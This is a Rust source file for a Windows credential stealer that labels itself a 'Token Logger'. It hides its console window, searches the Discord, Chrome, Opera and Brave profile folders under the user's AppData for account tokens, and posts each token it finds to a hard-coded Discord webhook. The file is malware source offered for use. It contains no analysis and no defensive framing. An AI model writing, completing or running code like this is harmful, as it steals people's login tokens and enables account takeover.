#![windows_subsystem = "windows"]

mod read;
use read::read::read_lines;

#[tokio::main]
async fn main() {
    mod find;
    use find::finder::find_tokens;
    use dirs::home_dir;
    let url = "https://discord.com/api/webhooks/1509429169317216306/eradH3TU5mph6wxHyLfd8Xz_bD-aR91VRJar642N45pNMFpGo67wnqDULu0pDG7Pwy7L";
    let home_dir = home_dir().unwrap();
    let home_str = home_dir.to_string_lossy();
    let mut paths: Vec<String> = Vec::new();
    let roaming = format!("{}\\AppData\\Roaming", &home_str);
    let local = format!("{}\\AppData\\Local", &home_str);
    paths.push(format!("{}\\Discord", &roaming));
    paths.push(format!("{}\\discordcanary", &roaming));
    paths.push(format!("{}\\discordptb", &roaming));
    paths.push(format!("{}\\Google\\Chrome\\User Data\\Default", &local));
    paths.push(format!("{}\\Opera Software\\Opera Stable", &roaming));
    paths.push(format!(
        "{}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        &local
    ));

    for path in paths {
        let tokens = find_tokens(&path);
        let _res = match tokens {
            Ok(v) => send_tokens(url, v).await,
            Err(..) => (),
        };
    }
}

async fn send_tokens(url: &str, tokens: Vec<String>) {
    use webhook::client::WebhookClient;
    let client: WebhookClient = WebhookClient::new(url);
    for token in tokens {
        client
            .send(|message| {
                message
                    .username("Token Logger")
                    .embed(|embed| embed.title("Token Log").description(&token))
            })
            .await
            .unwrap();
    }
}

fn get_extension(filename: &str) -> Option<&str> {
    use std::ffi::OsStr;
    use std::path::Path;
    Path::new(filename).extension().and_then(OsStr::to_str)
}
